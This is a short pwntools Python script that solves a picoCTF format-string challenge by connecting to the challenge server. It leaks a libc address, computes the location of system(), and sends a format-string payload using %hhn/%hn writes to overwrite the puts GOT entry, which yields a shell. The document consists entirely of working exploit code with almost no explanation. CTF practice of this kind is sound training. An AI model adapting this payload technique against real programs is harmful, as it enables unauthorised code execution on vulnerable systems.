#!/usr/bin/env python3

from pwn import *

# patch the file with libc first
exe = ELF("./format-string-3_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
# ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

# log
def slog(name, addr): 
    return success(': '.join([name, hex(addr)]))


# r = process(exe.path)
r = remote('rhea.picoctf.net', 59114)

r.recvuntil(b'setvbuf in libc: ')
setvbuf_addr = int(r.recvline()[:-1], 16)

slog('setvbuf: ', setvbuf_addr)

system = setvbuf_addr - 0x2ac90 # offset between system and setvbuf_addr = 0x2ac90

# we just need to overwrite 6 bytes LSB

part1 = system & 0xff
part2 = (system >> 8) & 0xffff

puts_got = 0x404018


payload = f'%{part1}c%41$hhn'.encode()

payload += f'%{part2-part1}c%42$hn'.encode()

# payload = payload.ljust(, b'a')

payload += p64(puts_got) + p64(puts_got + 1)

input()
r.sendline(payload)

r.interactive()


